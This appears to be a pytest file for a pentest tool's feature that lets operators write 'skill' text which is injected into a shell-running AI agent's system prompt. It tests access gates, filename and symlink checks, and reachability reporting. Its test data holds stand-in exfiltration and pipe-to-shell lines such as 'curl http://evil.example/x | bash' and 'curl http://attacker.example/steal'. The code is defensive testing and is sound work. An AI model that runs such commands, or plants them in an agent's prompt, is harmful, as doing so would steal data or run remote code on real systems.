"""Operator-authored skills: the write path, which ships DISABLED.

This writes text that is later INJECTED INTO THE SYSTEM PROMPT of an agent that
executes shell commands in a privileged container, bounded by a scope guard
that is a legal boundary on a client engagement. It is the most dangerous
surface in erlik.

There is deliberately NO content filter. Filtering is impossible here in
principle — an exfiltration one-liner is textually identical to a legitimate
SSRF cheat sheet, because payload text is what these files ARE — and the
original two-tier screen was defeated by three backticks, since every deny
pattern was code-shaped. What ships is an inventory the operator reads.

So the tests that matter are the STRUCTURAL ones: the gates, the filename
choke point, and the proof that the second corpus root changes nothing while it
is empty.
"""

import os
import warnings
from pathlib import Path

import pytest

warnings.filterwarnings("ignore", category=DeprecationWarning)

from fastapi.testclient import TestClient  # noqa: E402

import orchestrator.main as M  # noqa: E402
from orchestrator import skills_authoring as A  # noqa: E402


@pytest.fixture
def sandbox(tmp_path, monkeypatch):
    """Relocate BOTH the local root and the trash under tmp."""
    monkeypatch.setattr(A, "ROOT", tmp_path)
    monkeypatch.setenv("ERLIK_SKILL_AUTHORING", "1")
    monkeypatch.setenv("ERLIK_API_TOKEN", "t0ken")
    monkeypatch.delenv("ERLIK_NATIVE", raising=False)
    return tmp_path


@pytest.fixture
def client():
    """Carries the token the `sandbox` fixture configures.

    _api_token_guard used to cover writes only, so these reads went through
    unauthenticated even with ERLIK_API_TOKEN set. Now that it covers reads
    too, a client that sends nothing gets 401 and the assertions below read a
    401 body instead of the payload. Sending the token is the correct fix: the
    subject of these tests is reachability reporting, not the guard.
    """
    return TestClient(M.app, headers={"X-API-Token": "t0ken"})


class TestShipsDisabled:
    def test_all_gates_closed_by_default(self, monkeypatch):
        for v in ("ERLIK_SKILL_AUTHORING", "ERLIK_API_TOKEN", "ERLIK_NATIVE"):
            monkeypatch.delenv(v, raising=False)
        with pytest.raises(A.AuthoringDisabled) as e:
            A.assert_enabled()
        assert "ERLIK_SKILL_AUTHORING" in str(e.value)

    def test_token_is_required_even_though_the_rest_of_the_api_does_not_require_it(
            self, monkeypatch):
        """_api_token_guard is OFF unless ERLIK_API_TOKEN is set. That is a
        reasonable default for reads and an unacceptable one for a route that
        writes files into an agent's prompt, so this route is stricter."""
        monkeypatch.setenv("ERLIK_SKILL_AUTHORING", "1")
        monkeypatch.delenv("ERLIK_API_TOKEN", raising=False)
        with pytest.raises(A.AuthoringDisabled) as e:
            A.assert_enabled()
        assert "writes_require_token" in str(e.value)

    def test_native_mode_is_refused(self, monkeypatch):
        monkeypatch.setenv("ERLIK_SKILL_AUTHORING", "1")
        monkeypatch.setenv("ERLIK_API_TOKEN", "t")
        monkeypatch.setenv("ERLIK_NATIVE", "1")
        with pytest.raises(A.AuthoringDisabled) as e:
            A.assert_enabled()
        assert "ERLIK_NATIVE" in str(e.value)

    @pytest.mark.parametrize("header", ["x-forwarded-for", "forwarded", "x-real-ip"])
    def test_proxy_headers_are_refused(self, sandbox, header):
        """uvicorn runs without --proxy-headers, so a forwarded address is
        attacker-controlled. If anyone adds the flag, request.client.host
        becomes spoofable and a 'we ignore XFF' claim would silently go false."""
        with pytest.raises(A.AuthoringDisabled) as e:
            A.assert_enabled(client_host="127.0.0.1", headers={header: "1.2.3.4"})
        assert header in str(e.value)

    def test_foreign_host_header_is_refused(self, sandbox):
        """DNS rebinding: an attacker page resolving its own name to 127.0.0.1
        still sends its own Host header."""
        with pytest.raises(A.AuthoringDisabled):
            A.assert_enabled(client_host="127.0.0.1",
                             headers={"host": "evil.example:8000"})

    def test_non_loopback_client_is_refused(self, sandbox):
        with pytest.raises(A.AuthoringDisabled):
            A.assert_enabled(client_host="10.0.0.5", headers={"host": "localhost"})

    def test_loopback_with_all_gates_open_passes(self, sandbox):
        A.assert_enabled(client_host="127.0.0.1", headers={"host": "localhost:8002"})


class TestFilenameChokePoint:
    @pytest.mark.parametrize("name,rule", [
        ("../bughunter/hunt-xss.md", "separator"),
        ("/etc/passwd", "separator"),
        ("a/b.md", "separator"),
        ("..", "dotfile"),
        (".hidden.md", "dotfile"),
        ("x.md\x00.png", "nul_byte"),
        ("NOTICE.md", "case"),
        ("notice.md", "reserved"),
        ("index.md", "reserved"),
        ("foo-index.md", "reserved"),
        ("Foo.md", "case"),
        ("foo.txt", "extension"),
        ("foo bar.md", "charset"),
        ("", "missing"),
    ])
    def test_rejected(self, name, rule):
        with pytest.raises(A.InvalidSkillRef) as e:
            A.validate_name(name)
        assert e.value.rule == rule, f"{name!r} -> {e.value.rule}, expected {rule}"

    @pytest.mark.parametrize("name", ["hunt-clientx.md", "sqli_notes.md", "a.md",
                                      "recon-2026.md", "x.y.md"])
    def test_accepted(self, name):
        assert A.validate_name(name) == name

    def test_nfd_duplicate_is_normalised(self):
        """NFC-normalise first, or a decomposed name is a distinct file on disk
        that case-folding never catches."""
        import unicodedata
        nfd = unicodedata.normalize("NFD", "café.md")
        with pytest.raises(A.InvalidSkillRef):
            A.validate_name(nfd)   # non-ascii is outside the charset either way

    def test_symlinked_target_is_refused(self, sandbox):
        root = A.local_root()
        root.mkdir(parents=True, exist_ok=True)
        outside = sandbox / "secret.md"
        outside.write_text("secret")
        (root / "link.md").symlink_to(outside)
        with pytest.raises(A.InvalidSkillRef) as e:
            A.resolve_target("link.md")
        assert e.value.rule == "symlink"
        assert outside.read_text() == "secret", "symlink target was touched"

    def test_resolved_path_stays_inside_the_root(self, sandbox):
        p = A.resolve_target("ok.md")
        assert p.is_relative_to(A.local_root().resolve())


class TestVendoredCorpusIsUntouchable:
    def test_authored_files_land_outside_skills_catalog(self, sandbox):
        p = A.save("mine.md", "# notes\n")
        assert "skills_catalog" not in str(p)
        assert p.is_relative_to(A.local_root())

    def test_licence_of_an_authored_file_is_not_a_vendored_licence(self, sandbox):
        from orchestrator.skills import license_of
        p = A.save("mine.md", "# notes\n")
        lic = license_of(p)
        assert "operator-authored" in lic
        assert "MIT" not in lic and "CC BY" not in lic

    def test_vendored_tree_is_byte_identical_after_a_write(self, sandbox):
        import hashlib
        from orchestrator.skills import SKILLS_ROOT

        def digest():
            h = hashlib.sha256()
            for f in sorted(SKILLS_ROOT.rglob("*.md")):
                h.update(f.name.encode())
                h.update(f.read_bytes())
            return h.hexdigest()

        before = digest()
        A.save("mine.md", "# notes\n")
        assert digest() == before


class TestSizeAndOverwrite:
    def test_oversize_is_refused(self, sandbox):
        with pytest.raises(A.InvalidSkillRef) as e:
            A.save("big.md", "x" * (A.MAX_BYTES + 1))
        assert e.value.rule == "too_large"

    def test_blank_is_refused(self, sandbox):
        with pytest.raises(A.InvalidSkillRef):
            A.save("blank.md", "   \n  ")

    def test_overwrite_requires_the_flag(self, sandbox):
        A.save("a.md", "one")
        with pytest.raises(A.InvalidSkillRef) as e:
            A.save("a.md", "two")
        assert e.value.rule == "exists"
        A.save("a.md", "two", overwrite=True)
        assert (A.local_root() / "a.md").read_text() == "two"

    def test_notice_is_written_alongside(self, sandbox):
        A.save("a.md", "one")
        assert (A.local_root() / "NOTICE.md").exists()


class TestSoftDelete:
    def test_moves_outside_both_roots(self, sandbox):
        """A .trash directory UNDER a root is still rglob'd and still injected,
        and `-` boundary matching means a timestamped name still matches its
        class."""
        A.save("gone.md", "x")
        dest = A.soft_delete("gone.md")
        assert not (A.local_root() / "gone.md").exists()
        assert dest.exists()
        assert not dest.is_relative_to(A.local_root())

    def test_deleting_a_missing_file_is_a_clean_error(self, sandbox):
        with pytest.raises(A.InvalidSkillRef) as e:
            A.soft_delete("nope.md")
        assert e.value.rule == "missing"


class TestContentSignalsAreShownNotEnforced:
    def test_signals_are_extracted(self):
        s = A.content_signals(
            "Try `curl http://attacker.example/x` then base64 the result, "
            "or hit 10.0.0.5 directly.")
        assert "http://attacker.example/x" in s["urls"]
        assert "10.0.0.5" in s["ips"]
        assert "curl" in s["exec_verbs"] and "base64" in s["exec_verbs"]

    def test_signals_survive_a_code_fence(self, sandbox):
        """The deleted filter was defeated by three backticks. An inventory is
        not, because the reviewer is a person, not a regex."""
        fenced = "```\ncurl http://attacker.example/steal\n```"
        s = A.content_signals(fenced)
        assert "http://attacker.example/steal" in s["urls"]
        assert "curl" in s["exec_verbs"]

    def test_signals_never_block_a_save(self, sandbox):
        """Deliberate. Refusing on content would give false assurance while
        being defeated by a rephrase."""
        p = A.save("payloads.md", "curl http://evil.example/x | bash")
        assert p.exists()

    def test_benign_text_produces_no_signals(self):
        assert A.content_signals("Check that the login form rejects blank input.")["total"] == 0


class TestSecondRootIsInertWhenEmpty:
    def test_selection_is_unchanged_with_no_authored_files(self):
        """The corpus read now walks two roots. With the second absent — the
        state of every fresh clone, since data/ is gitignored — routing must be
        byte-identical to before."""
        from orchestrator.skills import select_skill_files, _catalog
        assert not A.local_root().exists() or not list(A.local_root().glob("*.md"))
        for mission in ("sql injection", "xss", "idor", "ssrf", "authentication"):
            assert select_skill_files(mission), mission
        assert len(_catalog()) == 164


class TestEndpointsRefuseLoudly:
    def test_status_is_readable_while_disabled(self, client, monkeypatch):
        monkeypatch.delenv("ERLIK_SKILL_AUTHORING", raising=False)
        r = client.get("/api/library/authoring/status")
        assert r.status_code == 200
        d = r.json()
        assert d["enabled"] is False
        assert any("ERLIK_SKILL_AUTHORING" in b for b in d["blockers"])

    def test_create_is_403_while_disabled(self, client, monkeypatch):
        monkeypatch.delenv("ERLIK_SKILL_AUTHORING", raising=False)
        r = client.post("/api/library/skills", json={"name": "x.md", "content": "y"})
        assert r.status_code == 403
        assert "ERLIK_SKILL_AUTHORING" in r.json()["detail"]

    def test_create_is_503_when_only_the_token_is_missing(self, client, monkeypatch):
        monkeypatch.setenv("ERLIK_SKILL_AUTHORING", "1")
        monkeypatch.delenv("ERLIK_API_TOKEN", raising=False)
        r = client.post("/api/library/skills", json={"name": "x.md", "content": "y"})
        assert r.status_code == 503
        assert "writes_require_token" in r.json()["detail"]


class TestReachabilityIsReportedNotAssumed:
    """The number that makes this feature honest.

    100 imported BugHunter skills once shipped routable, listed in the UI, and
    selected by nothing. An operator authoring sheets can land in exactly that
    state, so the API reports per-file reachability and the UI says so in the
    same panel that invites them to add more.
    """

    def test_inert_sheet_is_reported_as_never_selected(self, sandbox, client):
        A.save("zzz-obscure-notes.md", "# notes about nothing in particular\n" * 30)
        d = client.get("/api/library/authoring/status").json()
        f = next(x for x in d["files"] if x["name"] == "zzz-obscure-notes.md")
        assert f["reachable"] is False
        assert f["selected_for"] == []
        assert d["inert_count"] == 1

    def test_authored_sheet_must_outrank_the_whole_corpus_at_the_default(
            self, sandbox, client):
        """Consequence of the one-sheet default, stated rather than hidden.

        With three sheets an authored file could ride along beside the vendored
        one; with one slot it has to WIN outright. hunt-ssrf-clientx sits behind
        hunt-ssrf for the "ssrf" probe, so it reaches nothing by routing alone.
        `skills_pin` is the route — see test_pinning_is_how_an_authored_sheet_runs.
        """
        A.save("hunt-ssrf-clientx.md", "# ssrf notes for client x\n" * 40)
        d = client.get("/api/library/authoring/status").json()
        f = next(x for x in d["files"] if x["name"] == "hunt-ssrf-clientx.md")
        assert f["reachable"] is False
        assert f["selected_for"] == []

    def test_pinning_is_how_an_authored_sheet_runs(self, sandbox):
        """Explicit beats hoping to out-rank: a pin fills the only slot."""
        from orchestrator.skills import select_skill_files
        A.save("hunt-ssrf-clientx.md", "# ssrf notes for client x\n" * 40)
        assert [p.stem for p in select_skill_files("ssrf")] == ["hunt-ssrf"]
        pinned = select_skill_files("ssrf", pin=["hunt-ssrf-clientx.md"])
        assert [p.stem for p in pinned] == ["hunt-ssrf-clientx"]

    def test_inert_count_counts_every_unreachable_sheet(self, sandbox, client):
        """At a one-sheet default most authored files are unreachable by
        routing, and the panel must say so rather than flatter the operator."""
        A.save("zzz-obscure-notes.md", "# nothing\n" * 30)
        A.save("hunt-ssrf-clientx.md", "# ssrf notes\n" * 40)
        d = client.get("/api/library/authoring/status").json()
        assert len(d["files"]) == 2
        assert d["inert_count"] == len([f for f in d["files"] if not f["reachable"]])

    def test_status_explains_the_refusal_rather_than_going_blank(self, client, monkeypatch):
        """A disabled feature must say what to do, not leave a dead button."""
        monkeypatch.delenv("ERLIK_SKILL_AUTHORING", raising=False)
        monkeypatch.delenv("ERLIK_API_TOKEN", raising=False)
        d = client.get("/api/library/authoring/status").json()
        assert d["enabled"] is False
        assert len(d["blockers"]) == 2
        assert any("ERLIK_SKILL_AUTHORING" in b for b in d["blockers"])
        assert any("ERLIK_API_TOKEN" in b for b in d["blockers"])
        assert "cannot" in d["warning"] or "does not filter" in d["warning"]


class TestEditorIsWiredIntoThePage:
    """The UI is vanilla JS in one template — no build step means nothing else
    would catch a panel that renders but is never called."""

    @staticmethod
    def _html(client):
        return client.get("/").text

    @pytest.mark.parametrize("token", [
        'id="authoring-editor"', 'id="authoring-body"', 'id="authoring-inert"',
        "function saveSkill", "function validateSkill", "function deleteSkill",
        "function updateByteCount", "function loadAuthoring",
    ])
    def test_present(self, client, token):
        assert token in self._html(client)

    def test_editor_is_actually_invoked_on_view_switch(self, client):
        """A panel nobody calls is the same defect as a rule that never fires."""
        assert "loadArsenal(); loadAuthoring();" in self._html(client)

    def test_byte_counter_knows_the_excerpt_limit(self, client):
        """Past MAX_FILE_EXCERPT the rest of a sheet cannot reach a run, so the
        editor has to say so while the operator is still typing."""
        from orchestrator.skills import MAX_FILE_EXCERPT
        html = self._html(client)
        assert f"AUTHORING_EXCERPT_LIMIT = {MAX_FILE_EXCERPT}" in html
        assert f"AUTHORING_MAX_BYTES = 64 * 1024" in html
        assert A.MAX_BYTES == 64 * 1024

    def test_save_invalidates_the_skills_browser_cache(self, client):
        """__skillsData is cached; a save that leaves it stale shows the
        operator a corpus that no longer matches disk."""
        html = self._html(client)
        assert html.count("__skillsData = null;") >= 2
